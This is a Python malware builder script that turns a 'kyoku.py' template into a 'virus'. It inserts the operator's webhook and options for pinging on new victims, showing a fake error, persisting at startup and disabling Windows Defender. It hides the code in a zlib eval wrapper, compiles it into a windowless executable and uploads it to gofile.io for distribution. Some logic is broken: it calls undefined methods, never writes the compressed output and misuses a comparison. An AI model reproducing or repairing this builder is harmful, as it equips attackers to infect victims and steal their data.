import os
import random
import shutil
import subprocess
import sys
import time
from zlib import compress

import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init


class Builder:
    def __init__(self) -> None:
        self.loading()

        if not self.check():
            exit()

        self.webhook = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} enter your webhooooooook; ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}invalid webhook xd{Fore.RESET}")
            str(input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} press anything (for exit hehe)"))
            sys.exit()

        self.filename = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} enter you virus file name hehe: ')

        self.ping = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} ping on new victim?? ')
        if self.ping.lower() == 'y':
            self.ping = True
            self.pingtype = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} ping type (here/everyone) (def is here) ').lower()
            if self.pingtype not in ["here", "everyone"]:
                # default to @here if invalid ping type.
                self.pingtype == "here"
        else:
            self.ping = False
            self.pingtype = "none"

        self.error = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} do you want fake error with your virus opening (i think y)')
        if self.error.lower() == 'y':
            self.error = True
        else:
            self.error = False

        self.startup = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} do you want startup (exe file is running at startup) ?')
        if self.startup.lower() == 'y':
            self.startup = True
        else:
            self.startup = False

        self.defender = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} disable windows defender (this function maybe dont work) ')
        if self.defender.lower() == 'y':
            self.defender = True
        else:
            self.defender = False

        

        self.compy = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} compile exe???')

        if self.compy == 'y':
            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} do you want icon? if you want pls enter your icos file way')
            if self.icon == 'y':
                self.icon_exe()
            else:
                pass
        else:
            pass

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} yeeee you virus is prepared{Fore.RESET}')

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        try:
            self.gofile_upload(self.filename)
        except:
            pass

        run = input(
            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? : ')
        if run.lower() == 'y':
            self.run(self.filename)

        input(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
        sys.exit()

    def loading(self):
        p = Fore.MAGENTA + Style.DIM
        r = Fore.RED + Style.BRIGHT

        img = fr"""{p}
                                                                ...                                                                    ...
                                                              ,(e(*.                                                                 ,/er/.
                                                            ./erri(,                                                                 /erri(*
                                                           ./errias/,                                                              .*errias(,
                                                           *erriaser(,.             ..,,,*****/////////////****,,,...             ,/erriaser/.
                                                           *(erriaser(*.  .,*/(erriaserriaserriaserriaserriaserriaserrias(*,..  ,/erriaserrias/.
                                                           ,/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserri
                                                           .*erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserria.
                                                        .*e/rriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserr.
                                                       ,(/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserria.
                                                     .*/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaser.
                                                    .(/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserri.
                                                   */erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriase.
                                                 .(/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserr.
                                                ,/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserria.
                                               ./erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriase.
                                              ,(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserr.
                                             ,(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserria.
                                            .(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriase.
                                           ,/erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserr
                                          */erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserria.
                                          *(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserrias.
                                         .(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaser.
                                        .,erriaserriaserriaserriaserrias{r}errias{p}erriaserriaserriaserriaserriaserriaserriaserriaserr{r}errias{p}erriaserriase.
                                        ,/erriaserriaserriaserriaserrias{r}erriaserria{p}erriaserriaserriaserriaserriaserriaserria{r}erriaserrias{p}erriaserriase.
                                        *erriaserriaserriaserriaserrias{r}erriaserriaserria{p}erriaserriaserriaserriaserri{r}erriaserriaserrias{p}erriaserriaserri.
                                        *erriaserriaserriaserriaserrias{r}erriaserriaserriaserri{p}erriaserriaserriase{r}erriaserriaserriaser{p}erriaserriaserriae.
                                       ./erriaserriaserriaserriaserriase{r}erriaserriaserriaser{p}erriaserriaserrias{r}erriaserriaserriaser{p}erriaserriaserriaser.
                                       ,/erriaserriaserriaserriaserriaser{r}erriaserriaserri{p}erriaserriaserriaserri{r}erriaserriaserrias{p}erriaserriaserriaserr.
                                       ,(erriaserriaserriaserriaserriaserr{r}erriaserrias{p}erriaserriaserriaserriaserr{r}erriaserriase{p}erriaserriaserriaserrias
                                       ,(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserrias.
                                       ,(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserrias.
                                       ,(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserrias.
                                       ,(erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserria.
                                       ./erriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserriaserri.
                                        *erriaserriaserriaserriase(*....,*(erriaserriaserriaserriaserriaserriaserriaserriaserrias(/,....,/erriaserriaserriaserrias/.
                                          .*/erriaserriaserriase(*,.   .,, *//((iaserriaserriaserriaserriaserriaserriaserria((//*,,.   .,*/(erriaserriaserriaserrias(/,.
                                              .*(erriaserriaserriaserrias(.              ...,,,,***,,,...              .*erriaserriaserriaserriaserr/,
                                                  .,/(erriaserriaserrias.                                              ./erriaserriaserriaserri/*,.
                                                       .*/(erriaserrias.                                                 *(erriaserria(*,.
                                                            ..*/(erriase.(,                                                    ./erriaser(*,..
                                                                  .,err.,                                                        ,*/*,..


                Username: {os.getlogin()}
                 PC Name: {os.getenv('COMPUTERNAME')}
        Operating System: {os.getenv('OS')}
|"""

        with alive_bar(40) as bar:
            for _ in range(40):
                print(img)
                time.sleep(random.randint(1, 3) / 40)
                os.system('cls')
                bar()

            os.system('cls')

        print(Style.RESET_ALL)

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def random_string(self):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(15))

    def check(self):
        required_files = {'./kyoku.py',
                          './requirements.txt'}

        for file in required_files:
            if not os.path.isfile(file):
                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')

        os.system('mode con:cols=150 lines=20')

        return True

    def icon_exe(self):
        self.icon_name = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter the name of the icon: ')

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")

        if self.icon_name.endswith('.ico'):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")



    def mk_file(self, filename, webhook):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')

        with open('./kyoku.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%webhook_here%', webhook)
                    .replace("\"%ping_enabled%\"", str(self.ping))
                    .replace("%ping_type%", self.pingtype)
                    .replace("\"%_error_enabled%\"", str(self.error))
                    .replace("\"%_startup_enabled%\"", str(self.startup))
                    .replace("\"%_defender_enabled%\"", str(self.defender)))

        time.sleep(2)
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')

        with open(f"{filename}.py", mode='rb') as f:
            content = f.read()

        print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")

        original_size = len(content)
        content = self.compress(content)
        new_size = len(content)

    
           




    def compress(self, content):
        compressed_code = compress(content)
        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='{self.random_string()}',mode='exec'))"

    

    def compile(self, filename):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
        if self.icon == 'y':
            icon = "./" + self.icon_name
        else:
            icon = "NONE"
        os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')

    def run(self, filename):
        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')

        if os.path.isfile(f'./{filename}.exe'):
            os.system(f'start ./{filename}.exe')
        elif os.path.isfile(f'./{filename}.py'):
            os.system(f'python ./{filename}.py')

  

        

 

    def gofile_upload(self, filename):
        gofile = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={
            'file': open(f"{filename}.exe", 'rb')}).json()['data']['downloadPage']

        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} GoFile link: {gofile}{Fore.RESET}')


if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=212 lines=212')
        os.system("cls")

    Builder()